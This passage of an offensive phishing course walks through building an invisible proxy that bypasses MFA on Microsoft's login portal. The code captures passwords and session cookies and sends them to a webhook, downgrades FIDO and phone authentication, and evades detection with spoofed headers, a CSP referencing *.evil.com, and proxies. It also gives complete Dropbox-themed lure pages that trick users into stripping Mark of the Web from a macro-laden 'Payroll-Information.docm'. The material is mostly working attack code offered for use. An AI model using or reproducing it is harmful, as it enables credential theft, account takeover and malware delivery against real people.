    // Get and process content
    const contentBuffer = await response.arrayBuffer();
    let finalBuffer = Buffer.from(contentBuffer);
    
    const contentType = responseHeaders['content-type'] || '';
    const shouldRewrite = ['text/html', 'javascript', 'application/javascript', 'application/json']
      .some(type => contentType.includes(type));
    
    if (shouldRewrite && finalBuffer.length > 0) {
      try {
        const contentEncoding = responseHeaders['content-encoding'];
        const { content: textContent, wasDecompressed } = decompressContent(finalBuffer, contentEncoding);
        
        // Rewrite URLs in content
        let rewrittenContent = rewriteContent(textContent, proxyHost);
        
        // Apply authentication modifications for HTML content
        if (contentType.includes('text/html')) {
          rewrittenContent = applyFidoModifications(rewrittenContent);
          rewrittenContent = applyPhoneAuthModifications(rewrittenContent);
          rewrittenContent = removeIntegrityAttributes(rewrittenContent);
        }
        
        if (textContent !== rewrittenContent) {
          console.log(`[Rewrite] Content processed: ${contentType}`);
          finalBuffer = recompressContent(rewrittenContent, contentEncoding, wasDecompressed);
          
          // Remove encoding header if we couldn't recompress
          if (!wasDecompressed && contentEncoding) {
            delete responseHeaders['content-encoding'];
          }
        }
      } catch (error) {
        console.error(`[Rewrite] Error: ${error.message}`);
      }
    }
    
    // Update content length and send response
    responseHeaders['content-length'] = finalBuffer.length;
    res.writeHead(response.status, responseHeaders);
    res.end(finalBuffer);
    
  } catch (error) {
    console.error(`[Proxy] Error: ${error.message}`);
    res.writeHead(502, {
      'Content-Type': 'text/plain',
      ...CORS_HEADERS
    });
    res.end('Proxy Error: ' + error.message);
  }
});

```

## Launching Express Application
As previously mentioned, the Express application will run on `localhost:8080`. The final snippet below will launch the application on `localhost:8080` using `app.listen` and print to the console verbose details.

```
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`=================================`);
  console.log(`🚀 Microsoft Invisible Proxy`);
  console.log(`📍 Port: ${PORT}`);
  console.log(`🌐 Base URL: http://localhost:${PORT}`);
  console.log(`🎯 Special cases:`);
  console.log(`   /Me.htm → login.live.com`);
  console.log(`   /login → www.office.com`);
  console.log(`   [others] → ${DEFAULT_DOMAIN}`);
  console.log(`🔧 Auth redirect: ${SUCCESS_REDIRECT_URL}`);
  console.log(`📡 Webhook URL: ${WEBHOOK_URL}`);
  console.log(`✅ Compression support: gzip, deflate`);
  console.log(`=================================`);
});

```

## OPTIONAL: Launching Without Nginx
At the start of the module, we presented a diagram outlining the server architecture: Nginx acts as a reverse proxy to the Express application, which in turn proxies requests to the target website. There may be cases where one would want to test out the Express application without the Nginx reverse proxy for debugging purposes or to support a different infrastructure setup.

In this setup, we import three additional Node.js modules: `fs`, `http`, and `https`. The `fs` module is used to read the SSL certificate and private key from the file system, while `http` and `https` allow us to create HTTP and HTTPS servers, respectively. Assuming a valid SSL certificate has been issued (e.g. via Let's Encrypt), we can use `fs.readFileSync` to load the necessary certificate files. We then start a secure HTTPS server using `https.createServer` on port `443`. To ensure all traffic is encrypted, we also start an HTTP server with `http.createServer` that automatically redirects all HTTP requests to their HTTPS counterparts.

```
// Update your imports
const fs     = require('fs'); // new
const express = require('express');
const https  = require('https'); // new
const http   = require('http'); // new
const { URL } = require('url');
const zlib = require('zlib');
const fetch = require('node-fetch');

const app = express();

// ..
// ..
// All the previously shown code here
// ..
// ..

// SSL files
const sslOptions = {
  key:     fs.readFileSync('/etc/letsencrypt/live/domain.com/privkey.pem'),   // UPDATE PATH
  cert:    fs.readFileSync('/etc/letsencrypt/live/domain.com/fullchain.pem'), // UPDATE PATH
  dhparam: fs.readFileSync('/etc/letsencrypt/ssl-dhparams.pem')               // UPDATE PATH
};

https.createServer(sslOptions, app).listen(443, () => {
  console.log('HTTPS server running on port 443');
});

/* HTTP to HTTPS redirect */
http.createServer((req, res) => {
  res.writeHead(301, { Location: 'https://' + req.headers.host + req.url });
  res.end();
}).listen(80);

```

## Demo
Run the Express application using `screen` so that if you exit the terminal the application continues to run.

```
sudo apt install screen

# Create a new instance
screen -S proxyapp

# Run the express application
node app.js

# Detach
CTRL + A and D
# [detached from 126769.proxyapp]

# To re-attach
screen -r proxyapp

```

Note: The webhook formats the credentials and cookies in a way that's compatible with clients that can render markdown (e.g. Microsoft Teams). In the image below we use `webhook.site` which renders the raw content, making the output appear unorganized. Paste the content in markdownlivepreview to view the content correctly.

Once the cookies have been formatted into the correct JSON format, they can be imported via the StorageAce browser extension which was utilized in Module 78.

## Credits
Huge thank you to cgomez. This module would not be possible without him.

## Objectives
Update the invisible proxy code to modify the website title

Update the invisible proxy code to obfuscate the frontend HTML via Base64

Build a custom invisible proxy for a different login portal


---

# Novo Módulo 14 — Considerações de OPSEC do Proxy Invisível

Novo Módulo 14 — Considerações de OPSEC do Proxy Invisível

# Disclaimer

# Module 14 - Invisible Proxy: Opsec Considerations

## Introduction
In the previous module we developed a custom invisible proxy that's capable of capturing credentials and cookies. With that said, there are several opsec problems with the current implementation that can lead to our phishing server being detected and taken down. In this module, we will update our proxy to improve opsec behavior.

## Setting The User-Agent
The first low-effort but high-value opsec improvement that should be taken is setting a user-agent when making a request to the target server. When a user-agent is not specified, the HTTP library will use a default value, which in our case is "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)".

Organizations can see these user-agents in their logs and depending on the organization's maturity, they may have proactive measures to block suspicious or unknown user-agents. In the image below, @hackerkartellet shows sign-in logs from a phishing investigation where an attacker bypassed MFA in Microsoft 365 using the Axios HTTP client. The logs reveal the suspicious user-agent string "axios/1.7.7", a clear sign of automated access.

Furthermore, as previously mentioned, it's also possible to implement security policies that block access based on the user-agent. Therefore, it's generally safer to use a well-known and common user-agent string.

Fortunately, setting the user-agent can be easily done prior to making the `fetch` request to the target server by setting a value for `requestHeaders['user-agent']`.

```
// Prepare request headers
const requestHeaders = { ...req.headers };
requestHeaders['host'] = targetDomain;

// NEW: set user-agent
requestHeaders['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36';

delete requestHeaders['x-forwarded-for'];
delete requestHeaders['x-forwarded-proto'];

// ...
// ...

// Make the proxied request
const response = await fetch(targetUrl, {
method: req.method,
headers: requestHeaders,
body: requestBody,
redirect: 'manual'
});

```

## Deleting Referrer Header
An HTTP header that can reveal the phishing domain is the `Referer` header. It indicates the URL of the page that initiated the request, which can expose your domain to the target server. This can be mitigated by simply removing the `Referer` header from the proxied request before forwarding it.

```
delete requestHeaders['referer'];

```

## Deleting Origin Header
Another HTTP header that exposes our phishing domain is the `Origin` header. It shows where the request came from, and browsers automatically include it on sensitive requests like `POST`. This can reveal our domain to the target server. Unlike the `Referer` header, which includes the full URL and path, the `Origin` header only includes the scheme, host, and port which is still enough to expose the phishing domain.

If the target website rejects requests without an `Origin` header, instead of removing it, we can spoof it to match the expected origin. This allows the proxied request to appear as if it originated from the legitimate domain.

```
requestHeaders['origin'] = 'https://login.microsoftonline.com';

```
In the image below, we see both the `Referer` and `Origin` headers prior to making any changes to our proxy and the subsequent image shows the requests after deleting these headers.

## Content-Security-Policy (CSP)
Adding the `Content-Security-Policy` (CSP) HTTP header can also be useful in cases where the target website contains canaries or other logging endpoints that should be blocked. This was explained in the spotit.be article, where CSP was used to block embedded canaries via external domains such as `*.cloudfront.com` by restricting the allowed sources for scripts and other resources.

We define the policy below, adapted from the previously mentioned article with slight modifications. This policy will restrict resource loading to domains required to make the phishing page function correctly. Then we add the CSP header to our proxied request. Update `*.evil.com` with your domain name.

```
const CSP_HEADERS = {
  'Content-Security-Policy': "default-src 'self' data: 'unsafe-inline' 'unsafe-hashes' 'unsafe-eval' *.evil.com aadcdn.msauthimages.net aadcdn.msftauthimages.net aadcdn.msauth.net aadcdn.msftauth.net *.live.com *.office.com *.office.net"
};

// ...
// ...

// Add CORS headers and remove security headers
Object.assign(responseHeaders, CORS_HEADERS);

// NEW: Set CSP header
Object.assign(responseHeaders, CSP_HEADERS);

SECURITY_HEADERS_TO_REMOVE.forEach(header => {
    delete responseHeaders[header];
});

```
In our case, this policy will block the `browser.events.data.microsoft.com` endpoint which is Microsoft's data logging endpoint.

## Origin Proxy
An important operational security consideration is using a proxy between the application server (e.g. the Express server) and the target server to conceal our server's IP address. This approach ensures that the application server never communicates directly with the destination server; instead, all traffic is routed exclusively through the proxy, effectively shielding our infrastructure.

To use an HTTP/S proxy in an Express application, begin by installing the `https-proxy-agent` package using `npm`:

```
npm install https-proxy-agent

```
Then, import the `https-proxy-agent` module into your application and configure it with your proxy server's credentials and address. This setup allows you to route outbound HTTP or HTTPS requests through the specified proxy, ensuring all traffic from your server to the target server is tunneled through the proxy:

```
const { HttpsProxyAgent } = require('https-proxy-agent');

const proxyUrl = 'http://username:password@IP:PORT'; // Replace with your actual proxy credentials and endpoint
const agent = new HttpsProxyAgent(proxyUrl);

```
Once configured, update the `fetch` to use the proxy agent when making requests.

```
const response = await fetch(targetUrl, {
  method: req.method,
  headers: requestHeaders,
  body: requestBody,
  redirect: 'manual',
  agent,
});

```
We can verify that the public IP address belongs to the proxy server, not our application server, by making a request to `ipify.org` and inspecting the returned IP address. This helps confirm that outbound traffic is being correctly routed through the proxy.

```
const checkIpAddress = 'https://api.ipify.org?format=json';

const response2 = await fetch(checkIpAddress, {
  method: 'GET',
  agent,
});

const data = await response2.json();
console.log('IP returned:', data);

```

### SOCKS Proxy
It's also possible to use a SOCKS proxy instead of an HTTP/S proxy. Begin by installing the `socks-proxy-agent` package using `npm`:

```
npm install socks-proxy-agent

```
Import the `socks-proxy-agent` module into the application and setup the proxy URL which must start with `socks5://`.

```
const { SocksProxyAgent } = require('socks-proxy-agent');

const proxyUrl = 'socks5://username:password@IP:PORT'; // update
const agent = new SocksProxyAgent(proxyUrl);

```
Finally, update the `fetch` request to use the proxy agent when making requests.

```
const response = await fetch(targetUrl, {
  method: req.method,
  headers: requestHeaders,
  body: requestBody,
  redirect: 'manual',
  agent,
});

```

## Conclusion
This module covered key operational security considerations that should be implemented in your custom invisible proxy. Integrating these measures into your proxy application is essential to reduce the risk of detection and prevent defenders from quickly identifying and blocking your website.

## Objectives
Integrate anti-bot checks to block common scanning bots

Modify the JA4/S fingerprint


---

# Novo Módulo 15 — Bypass de MOTW via FileFix

Novo Módulo 15 — Bypass de MOTW via FileFix

- # Novo Módulo 15 — Bypass de MOTW via FileFix

# Disclaimer
# Module 15 - MOTW Bypass Via FileFix Variations

## Introduction To MOTW

IMPORTANT: The methods discussed in this module were patched by Chromium. The module will remain up for those interested in further research.
One common hurdle in conducting payload-based phishing campaigns against Windows systems is the Mark of the Web (MOTW) feature. This security mechanism adds metadata to files, specifically a `Zone.Identifier` alternate data stream, to indicate their origin. When a file is downloaded from the internet or received via email, Windows assigns it a zone identifier, marking it as originating from an untrusted or potentially unsafe source. This tagging can trigger warnings or restrict execution, hindering the effectiveness of malicious payloads. The possible values for the `Zone.Identifier` attribute are listed below:
`0` – The file was created on the local computer.

- `1` – The file originated from your organization’s intranet.

- `2` – The file came from a site you’ve marked as trusted.

- `3` – The file was downloaded from the internet.

- `4` – The file came from an untrusted zone (sites that might harm your computer or data).

We can use a simple PowerShell command to check the file's MOTW:

```
Get-Content file.zip -Stream Zone.Identifier

```
The sample output below indicates the file was downloaded from the internet:

```
[ZoneTransfers]
ZoneId=3
HostUrl=https://example.com

```

## FileFix
FileFix is a social engineering technique that tricks the user into unknowingly executing malicious code, similarly to ClickFix. There are two documented FileFix techniques. Review the following techniques prior to advancing to the module.

- FileFix - A ClickFix Alternative - The original FileFix technique.

- FileFix Part 2 - A variation of FileFix that results in MOTW bypass.

This module will cover two FileFix methods that are used to evade MOTW. Importantly, both techniques only work on binary files, this means file types such as `.reg`, `.vbs`, `.hta` will not work.

## Method 1: Open File Shortcut MOTW Bypass
The first MOTW bypass technique is a variation of the FileFix method, which leverages the `Ctrl + O` shortcut. In this method, the target user visits our phishing website and clicks a button to download the payload file. The critical step comes next: the user is social engineered to reopen the file using the `Ctrl + O` shortcut. This causes the browser to attempt to reopen the file from the local system. If the payload is a binary file (such as a DOCM, ZIP, EXE, or MSI), the browser will re-download it from the local file system, effectively stripping the MOTW and bypassing associated security warnings.

The HTML template below emulates a Dropbox file-sharing interface. It presents a secure file download prompt styled with realistic Dropbox branding. Upon clicking the download button, a macro-embedded document is downloaded and the interface transitions to display the fake decryption instructions, guiding the user through opening the file using the `Ctrl + O` shortcut key.

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Dropbox - Secure File Shared</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f7f9fb;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #ffffff;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
      padding: 40px;
      text-align: center;
      max-width: 480px;
      width: 90%;
      transition: all 0.3s ease;
    }

    .logo {
      width: 80px;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 22px;
      color: #007ee5;
      margin-bottom: 10px;
    }

    .message,
    .download-btn {
      transition: opacity 0.3s ease;
    }

    .message {
      font-size: 15px;
      color: #444;
      margin-bottom: 25px;
    }

    .download-btn {
      background-color: #007ee5;
      color: #ffffff;
      padding: 12px 28px;
      border: none;
      border-radius: 6px;
      font-size: 15px;
      cursor: pointer;
      text-decoration: none;
      transition: background-color 0.3s ease;
      display: inline-block;
      margin-bottom: 30px;
    }

    .download-btn:hover {
      background-color: #005eb8;
    }

    .instructions {
      display: none;
      text-align: left;
      font-size: 15px;
      color: #2b2b2b;
      background-color: #ffffff;
      border: 1px solid #dce3ea;
      border-radius: 10px;
      padding: 24px 20px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
    }

    .instructions h2 {
      font-size: 18px;
      color: #007ee5;
      margin-top: 0;
      margin-bottom: 12px;
    }

    .instructions ol {
      padding-left: 20px;
      margin: 0;
    }

    .instructions li {
      margin-bottom: 12px;
      line-height: 1.6;
    }

    .filename {
      font-weight: 600;
      color: #222;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://cfl.dropboxstatic.com/static/images/brand/glyph@2x-vflJ1vxbq.png" alt="Dropbox Logo" class="logo" />
    <h1>Encrypted File Shared via Dropbox</h1>
    <p class="message" id="message">The encrypted file <span class="filename">Payroll-Information.docm</span> has been securely shared with you.</p>
    <a href="./Payroll-Information.docm" class="download-btn" id="downloadBtn" download>Download File</a>
    <div class="instructions" id="instructions">
      <h2>Decrypt and Open the File</h2>
      <ol>
        <li>Press <strong>Ctrl + O</strong> in your browser window.</li>
        <li>Navigate to your Downloads folder and select <span class="filename">Payroll Information.docm</span>.</li>
        <li>The file will re-download decrypted and can be opened normally.</li>
      </ol>
    </div>
  </div>

  <script>
    const downloadBtn = document.getElementById('downloadBtn');
    const instructions = document.getElementById('instructions');
    const message = document.getElementById('message');

    downloadBtn.addEventListener('click', () => {
      // Hide download button and message
      downloadBtn.style.display = 'none';
      message.style.display = 'none';

      // Show instructions after brief delay
      setTimeout(() => {
        instructions.style.display = 'block';
      }, 200);
    });
  </script>
</body>
</html>

```

As previously mentioned, the macro-embedded document file is downloaded when the download button is clicked and the fake decryption instructions are shown to the user.

We can inspect the initial downloaded file's MOTW status by right-clicking and selecting "Properties". Doing so will show that the file originates from an untrusted source, meaning the file is currently tagged with MOTW.

Assuming the user follows the stated instructions, they would press `Ctrl + O` to open the Windows File Explorer and select the macro-embedded file which was previously downloaded. The file is automatically re-downloaded by the browser.

Re-inspecting the file properties show that the MOTW was stripped from the file.

We can confirm that MOTW has been stripped by opening the file and checking whether the macros execute, as Windows blocks macro execution in files that have MOTW applied.

The video can be found in folder: `./videos/demo-1-invisible-proxy.mp4`

## Method 2: Drag & Drop MOTW Bypass
The next MOTW bypass method uses a phishing page that also includes a button to download a file. Once the button is clicked and the file is downloaded, a drag-and-drop area appears, instructing the user to drag and drop the file into it. The catch is that we do not handle the drag-and-drop with any JavaScript and instead, we let the browser handle it. This causes the file to be re-downloaded from the local file system, stripping the MOTW.

Remember that the file must be a binary format because otherwise the browser will open it directly instead of re-downloading it.

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Dropbox - Secure File Shared</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f7f9fb;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #ffffff;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
      padding: 40px;
      text-align: center;
      max-width: 480px;
      width: 90%;
      transition: all 0.3s ease;
    }

    .logo {
      width: 80px;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 22px;
      color: #007ee5;
      margin-bottom: 10px;
      transition: all 0.3s ease;
    }

    .message,
    .download-btn {
      transition: opacity 0.3s ease;
    }

    .message {
      font-size: 15px;
      color: #444;
      margin-bottom: 25px;
    }

    .download-btn {
      background-color: #007ee5;
      color: #ffffff;
      padding: 12px 28px;
      border: none;
      border-radius: 6px;
      font-size: 15px;
      cursor: pointer;
      text-decoration: none;
      transition: background-color 0.3s ease;
      display: inline-block;
      margin-bottom: 30px;
    }

    .download-btn:hover {
      background-color: #005eb8;
    }

    .instructions {
      display: none;
      text-align: left;
      font-size: 15px;
      color: #2b2b2b;
      background-color: #ffffff;
      border: 1px solid #dce3ea;
      border-radius: 10px;
      padding: 24px 20px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
      margin-bottom: 25px;
    }

    .instructions p {
      margin: 0;
    }

    .filename {
      font-weight: 600;
      color: #222;
    }

    .drop-zone {
      display: none;
      border: 2px dashed #007ee5;
      border-radius: 10px;
      padding: 40px 20px;
      text-align: center;
      font-size: 16px;
      color: #007ee5;
      background-color: #f1f7ff;
      transition: all 0.3s ease;
    }

    .drop-zone.highlight {
      background-color: #e6f0fc;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://cfl.dropboxstatic.com/static/images/brand/glyph@2x-vflJ1vxbq.png" alt="Dropbox Logo" class="logo" />
    <h1 id="mainHeading">Encrypted File Shared via Dropbox</h1>
    <p class="message" id="message">The encrypted file <span class="filename">Payroll-Information.docm</span> has been securely shared with you.</p>
    <a href="./Payroll-Information.docm" class="download-btn" id="downloadBtn" download>Download File</a>

    <div class="instructions" id="instructions">
      <p>Drag and drop the downloaded <span class="filename">Payroll-Information.docm</span> file below to decrypt it.</p>
    </div>

    <div class="drop-zone" id="dropZone">
      Drop file here
    </div>
  </div>

  <script>
    const downloadBtn = document.getElementById('downloadBtn');
    const instructions = document.getElementById('instructions');
    const message = document.getElementById('message');
    const dropZone = document.getElementById('dropZone');
    const mainHeading = document.getElementById('mainHeading');

    downloadBtn.addEventListener('click', () => {
      downloadBtn.style.display = 'none';
      message.style.display = 'none';
      mainHeading.textContent = 'Decrypt File';

      setTimeout(() => {
        instructions.style.display = 'block';
        dropZone.style.display = 'block';
      }, 200);
    });
  </script>
</body>
</html>

```

This technique has a caveat: because we're letting the browser handle the file, we can't use JavaScript to directly verify that the user dragged and dropped the file. Therefore, we must rely on indirect signals, such as the window losing focus after a drag-and-drop action, to infer that the file was successfully re-downloaded. The JavaScript code below checks for three indicators:

- The user initiated a drag action by moving a file into the drop zone.

- The file continued to hover over the drop zone, triggering a `dragover` event.

- The browser window lost focus, suggesting the file was dropped and re-downloaded locally.

Once the actions are completed, the success banner is shown and the sequence is marked as completed.

```
const dropZone = document.getElementById('dropZone');
const successBanner = document.getElementById('successBanner');

let dragEntered = false;
let dragOvered = false;
let sequenceComplete = false;

dropZone.addEventListener('dragenter', () => {
    dragEntered = true;
});

dropZone.addEventListener('dragover', () => {
    if (dragEntered) {
    dragOvered = true;
    }
});

window.addEventListener('blur', () => {
    if (dragEntered && dragOvered && !sequenceComplete) {
    successBanner.style.display = 'block';
    sequenceComplete = true;
    }
});

```
The updated HTML template below includes the required JavaScript code to indirectly determine that the user dragged and dropped the file and shows a success banner upon completion.

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Dropbox - Secure File Shared</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f7f9fb;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #ffffff;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
      padding: 40px;
      text-align: center;
      max-width: 480px;
      width: 90%;
      transition: all 0.3s ease;
    }

    .logo {
      width: 80px;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 22px;
      color: #007ee5;
      margin-bottom: 10px;
      transition: all 0.3s ease;
    }

    .message,
    .download-btn {
      transition: opacity 0.3s ease;
    }

    .message {
      font-size: 15px;
      color: #444;
      margin-bottom: 25px;
    }

    .download-btn {
      background-color: #007ee5;
      color: #ffffff;
      padding: 12px 28px;
      border: none;
      border-radius: 6px;
      font-size: 15px;
      cursor: pointer;
      text-decoration: none;
      transition: background-color 0.3s ease;
      display: inline-block;
      margin-bottom: 30px;
    }

    .download-btn:hover {
      background-color: #005eb8;
    }

    .instructions {
      display: none;
      text-align: left;
      font-size: 15px;
      color: #2b2b2b;
      background-color: #ffffff;
      border: 1px solid #dce3ea;
      border-radius: 10px;
      padding: 24px 20px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
      margin-bottom: 25px;
    }

    .instructions p {
      margin: 0;
    }

    .filename {
      font-weight: 600;
      color: #222;
    }

    .drop-zone {
      display: none;
      border: 2px dashed #007ee5;
      border-radius: 10px;
      padding: 40px 20px;
      text-align: center;
      font-size: 16px;
      color: #007ee5;
      background-color: #f1f7ff;
      transition: all 0.3s ease;
    }

    .drop-zone.highlight {
      background-color: #e6f0fc;
    }

    .success-banner {
      display: none;
      background-color: #e6f9ec;
      border: 2px solid #2e8b57;
      color: #2e8b57;
      font-size: 16px;
      padding: 15px 20px;
      margin-top: 25px;
      border-radius: 8px;
      font-weight: 600;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://cfl.dropboxstatic.com/static/images/brand/glyph@2x-vflJ1vxbq.png" alt="Dropbox Logo" class="logo" />
    <h1 id="mainHeading">Encrypted File Shared via Dropbox</h1>
    <p class="message" id="message">The encrypted file <span class="filename">Payroll-Information.docm</span> has been securely shared with you.</p>
    <a href="./Payroll-Information.docm" class="download-btn" id="downloadBtn" download>Download File</a>

    <div class="instructions" id="instructions">
      <p>Drag and drop the downloaded <span class="filename">Payroll Information.docm</span> file below to decrypt it.</p>
    </div>

    <div class="drop-zone" id="dropZone">
      Drop file here
    </div>

    <div class="success-banner" id="successBanner">
      File successfully decrypted.
    </div>
  </div>

  <script>
    const downloadBtn = document.getElementById('downloadBtn');
    const instructions = document.getElementById('instructions');
    const message = document.getElementById('message');
    const dropZone = document.getElementById('dropZone');
    const mainHeading = document.getElementById('mainHeading');
    const successBanner = document.getElementById('successBanner');

    downloadBtn.addEventListener('click', () => {
      downloadBtn.style.display = 'none';
      message.style.display = 'none';
      mainHeading.textContent = 'Decrypt File';

      setTimeout(() => {
        instructions.style.display = 'block';
        dropZone.style.display = 'block';
      }, 200);
    });

    let dragEntered = false;
    let dragOvered = false;
    let sequenceComplete = false;

    dropZone.addEventListener('dragenter', () => {
      dragEntered = true;
    });

    dropZone.addEventListener('dragover', () => {
      if (dragEntered) {
        dragOvered = true;
      }
    });

    window.addEventListener('blur', () => {
      if (dragEntered && dragOvered && !sequenceComplete) {
        successBanner.style.display = 'block';
        sequenceComplete = true;
      }
    });
  </script>
</body>
</html>

```

## Credits
Shoutout to Octoberfest73 for testing the Drag & Drop MOTW bypass technique, contributing ideas, proof-of-concepts, templates, and providing valuable feedback throughout the process.

## Objectives
Test both FileFix variations and confirm that MOTW is stripped

Investigate why these techniques do not work against non-binary files


---

# Novo Módulo 16 — Bypass de MFA via Proxy Invisível com Cloudflare Workers

Novo Módulo 16 — Bypass de MFA via Proxy Invisível com Cloudflare Workers

- # Novo Módulo 16 — Bypass de MFA via Proxy Invisível com Cloudflare Workers

# Disclaimer
# Module 16 - MFA Bypass: Building An Invisible Proxy Via Cloudflare Workers

## Introduction
Previously in New Module 13 - MFA Bypass: Building An Invisible Proxy, we developed an invisible proxy capable of capturing credentials and bypassing MFA on Microsoft's authentication portal. In this module, we will perform a similar process while utilizing Cloudflare Workers. This provides an added benefit of using a trusted subdomain to host our phishing capability.
Review Module 65 - Serverless Phishing: Cloudflare Worker if you need an introduction to Cloudflare Workers.

## Prerequisites
Prior to developing the invisible proxy, we will need to setup a Cloudflare Worker. Navigate to the Cloudflare dashboard, select "Computer (Workers)" and choose the "Start with Hello World" option to start with a basic template.Once the Worker is created, press the "Edit Code" button located at the top right of the page. This will open the code editor where we will insert our invisible proxy implementation.
## Invisible Proxy Implementation
The invisible proxy implementation contains several functions that are designated for specific purposes. Each set of functions have been added to specific categories for simplification and modularity. The functions have been split up into three categories:
Utility functions – General-purpose helper functions used throughout the application.

- Webhook functions – Send formatted data (like credentials or cookies) to an external webhook endpoint for logging or alerting.

- Core functions – Handle key processing logic such as extracting credentials, modifying responses, and performing rewrites.

- Main event listener - Unlike New Module 13 - MFA Bypass: Building An Invisible Proxy, we do not need middleware functions. Instead, when using a Cloudflare Worker we simply need a `fetch` event listener that passes the incoming request into our handler, as shown below.

```
addEventListener('fetch', event => {
    event.respondWith(...); //
});

```
This will intercept every incoming HTTP request to the Worker and allow you to provide a custom response.

### Utility Functions
The first category of functions are the utility functions which are reusable code designed to perform a general-purpose task that supports the main functionality of an application. We have eleven utility functions:

- `setCorsHeaders()` - Sets standard CORS headers. This must always be called when processing the incoming HTTP request.

- `isModifiableContent()` - Checks if the incoming content type is modifiable. This is based on the constant array `MODIFIABLE_CONTENT_TYPES`.

- `isTelemetryRequest()` - Checks if the incoming request is a telemetry request. This is based on the constant array `TELEMETRY_PATTERNS`.

- `applyAuthModifications()` - Checks if FIDO and phone authentication downgrade flags are enabled (`ENABLE_FIDO_HTML_MODIFICATION` and `ENABLE_PHONE_AUTH_MODIFICATION`) and calls `applyFidoBypass` and `applyPhoneAuthPreference`, respectively.

- `applyFidoBypass()` - Modifies HTML content to disable FIDO as the default authentication method and injects a script to remove related UI elements.

- `applyPhoneAuthPreference()` - Modifies HTML content to prefer phone-based MFA authentication.

- `createFidoRemovalScript()` - Returns a JavaScript snippet that removes FIDO-related HTML elements from a webpage.

- `determineTarget()` - Determines where to send an incoming request based on the URL path and referrer

- `prepareRequestHeaders()` - Prepares requests headers for forwarding.

- `shouldCaptureAuthCookies()` - Checks if the authentication cookies exist in the request (i.e. `ESTSAUTH` and `ESTSAUTHPERSISTENT`). If they do, it calls `captureAuthCookies` to capture the cookies.

### Webhook Functions
The next category of functions are webhook function which will be responsible for sending credentials and cookies to a given webhook URL.

- `sendToWebhook()` - Sends data to the configured webhook endpoint, if the webhook notifications flag is enabled (`ENABLE_WEBHOOK_NOTIFICATIONS`).

- `createRequestMetadata()` - Creates a metadata object which is passed to `formatCredentialMessage` or `formatCookieMessage`. This object contains information about the client such as IP address, region and user agent.

- `formatCredentialMessage()` - Formats the credentials message and user metadata prior to calling `sendToWebhook`.

- `formatCookieMessage()` - Formats the cookie message and user metadata prior to calling `sendToWebhook`.

### Core Functions
The core functions handle the essential logic that enables the proxy to operate reliably, ensuring that requests and responses are processed, interpreted, and modified as needed to maintain consistent and expected behavior across the application.

- `handleFaviconRequest()` - Specifically handles favicon requests (i.e. requests for `favicon.ico`).

- `captureCredentials()` - Extracts the username and password from the login form and sends them to a webhook endpoint.

- `removeTelemetryTracking()` - Blocks requests to Microsoft's analytics and logging endpoints.

- `applyUrlRewriting()` - Performs URL rewriting to replace Microsoft's domain with our proxy domain name.

- `processResponse()` - Handles response processing.

- `transformContent()` - Applies a series of content rewrites on an incoming HTTP request.

- `handleCookies()` - Captures and rewrites `Set-Cookie` headers. This ensures cookies will be scoped to the proxy host instead of the original Microsoft domains.

- `captureAuthCookies()` - Captures authentication cookies and sends webhook.

- `forwardRequest()` - Forwards requests and handle Microsoft's redirect chain

- `processRequest()` - This is the main function that processes incoming requests. It will call other functions and perform routing, security checks, and response processing.

## Implementation Walkthrough
With the components of the code broken down, we will now dive into the implementations and the associated code.

### Main Event Listener
As previously mentioned, when using a Cloudflare Worker we need a `fetch` event listener that passes the incoming request into our handler function. In our case, the event listener will call the core function `processRequest` (explained later) and pass `event.request` which contains all the details of the incoming HTTP request (i.e. the URL, headers, method, and body). This will allow us to apply the necessary modifications to the incoming HTTP request.

```
// Main event listener
addEventListener('fetch', event => {
    event.respondWith(processRequest(event.request));
});

```

### Configuration Values
Next, we define several constants and flags that allow us to easily make changes in the future, if necessary. First we define the `default_auth_target` which is the primary domain being proxied and the `webhook_url` which defines where the credentials and cookies will be sent. The `last_cookie_sent_timestamp` variable keeps track of the last time a webhook notification was sent, for throttling purposes.

Furthermore, we have three boolean values `ENABLE_FIDO_HTML_MODIFICATION`, `ENABLE_PHONE_AUTH_MODIFICATION`, and `ENABLE_WEBHOOK_NOTIFICATIONS` which respectively enable or disable FIDO downgrade, phone MFA downgrade, and webhook notifications.

You can also implement access control easily by adding values into `blocked_regions` and `blocked_ips` which will block the specified countries and IP addresses.

